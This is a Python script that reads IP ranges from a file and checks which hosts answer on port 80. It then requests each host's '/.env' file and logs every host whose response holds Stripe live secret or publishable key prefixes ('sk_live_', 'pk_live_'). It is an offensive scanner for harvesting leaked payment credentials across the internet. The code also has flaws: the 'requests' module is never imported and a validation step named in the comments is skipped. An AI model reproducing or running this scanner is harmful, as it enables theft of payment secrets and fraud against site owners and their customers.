import concurrent.futures
import re
from ipaddress import ip_address, ip_network
import socket

def validate_ip(ip, port=80, timeout=5):
    """Checks if an IP address is reachable on the specified port."""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.settimeout(timeout)
        try:
            sock.connect((ip, port))
            return True
        except:
            return False

def check_ip_and_extract(ip):
    """Validates IP, makes request, and checks for keys."""
    if validate_ip(ip):
        try:
            response = requests.get(f"http://{ip}/.env", timeout=10)
            if any(key in response.text for key in ["sk_live_", "pk_live_"]):
                return ip
        except:
            pass
    return None

def process_line(line):
    """Processes a line from the input file."""
    for ip in ip_network(line.strip()):
        ip = str(ip)
        with open("step_1.txt", "a") as f1:
            f1.write(f"{ip}\n")

def process_validated_line(line):
    """Processes a line from the validated IP file."""
    ip = line.strip()
    valid_ip = check_ip_and_extract(ip)
    if valid_ip:
        with open("step_3_valid.txt", "a") as f3:
            f3.write(f"{valid_ip}\n")

def main():
    num_threads = int(input("Enter the number of threads: "))
    
    # Step 1 & 2: Process input file and validate IPs
    with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
        with open("input.txt", "r") as f:
            executor.map(process_line, f)

    # Step 3 & 4: Check for keys and extract valid results
    with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
        with open("step_1.txt", "r") as f2:
            executor.map(process_validated_line, f2)

    input("Processing complete. Press Enter or Space to exit...")

if __name__ == "__main__":
    main()